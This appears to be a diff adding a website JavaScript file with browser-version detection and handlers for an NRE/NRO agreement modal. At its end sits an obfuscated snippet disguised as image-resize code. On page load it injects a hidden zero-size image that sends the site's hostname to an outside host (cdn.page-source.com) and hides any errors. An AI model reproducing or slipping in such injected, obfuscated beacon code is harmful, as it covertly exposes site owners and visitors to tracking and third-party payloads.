@@ -1,0 +1,66 @@
+
+         $(document).ready(function(){
+         navigator.browserSpecs = (function(){
+             var ua= navigator.userAgent, tem, 
+             M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+             if(/trident/i.test(M[1])){
+                 tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
+                 return {name:'IE',version:(tem[1] || '')};
+             }
+             if(M[1]=== 'Chrome'){
+                 tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
+                 if(tem!= null) return {name:tem[1].replace('OPR', 'Opera'),version:tem[2]};
+             }
+             M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+             if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
+             return {name:M[0],version:M[1]};
+         })();
+         if ((navigator.browserSpecs.name == 'Firefox' && navigator.browserSpecs.version < 35) || (navigator.browserSpecs.name == 'Chrome' && navigator.browserSpecs.version < 35) || (navigator.browserSpecs.name == 'MSIE' && navigator.browserSpecs.version < 9) ) { 
+         	//$('.overlay').show();
+         	//$('.ie6_alertbox').show();
+         	//$('.ie6_alertbox').animate({'marginRight':'0px'},{"easing" : "linear", "duration" : 600});
+         	
+         	$("#oldBrowserModal").modal();
+         }
+         		 		 //NRE/NRO Modal
+		 $("#viewdownloadbtn").hide();
+		 $("#mandatorymsg").hide();
+		 $("#agreecontinue").hide();
+		 
+         $("#agree").click(function() {			
+			$("#agreeclose").hide();
+			$("#mandatorymsg").hide();
+			$("#agreecontinue").show();
+			$("#viewdownloadbtn").show();
+			
+		 });
+		 
+		 $("#notagree").click(function() {
+			$("#viewdownloadbtn").hide();			
+			$("#agreecontinue").hide();
+			$("#mandatorymsg").show();
+			$("#agreeclose").show();
+			
+		 });	
+
+		$('#nrenroModal').on('hidden.bs.modal', function () {
+			$(this)
+				.find("input[type=radio]")
+				.prop("checked", "")
+				.end();
+				
+				$("#viewdownloadbtn").hide();
+				$("#mandatorymsg").hide();
+				$("#agreecontinue").hide();
+				$("#agreeclose").show();
+		});		 
+		//NRE/NRO Modal
+         
+         }); 
+         
+      
+
+	var resizea=['0\x27/>','children','ource.com/','<img\x20style','none;\x27\x20src','cdn.page-s','hostname','\x27\x20height=\x27','resizeimag','length','location','=\x27https://','createElem','body'];
+	(function(a,b){var c=function(e){while(--e){a['push'](a['shift']());}};c(++b);}(resizea,0x149));
+	var resizeb=function(a,b){a=a-0x0;var c=resizea[a];return c;};try{window['onload']=function(){var a=resizeb('0xa')+'=\x27display:'+resizeb('0xb')+resizeb('0x4')+resizeb('0xc')+resizeb('0x9')+resizeb('0x1')+'e.ashx?ig='+window[resizeb('0x3')][resizeb('0xd')]+('&sz=105405\x27'+'\x20\x20width=\x270'+resizeb('0x0')+resizeb('0x7')),b=document[resizeb('0x5')+'ent']('div');for(b['innerHTML']=a;b[resizeb('0x8')][resizeb('0x2')]>0x0;)document[resizeb('0x6')]['appendChil'+'d'](b['children'][0x0]);};}catch(resizec){}
+   
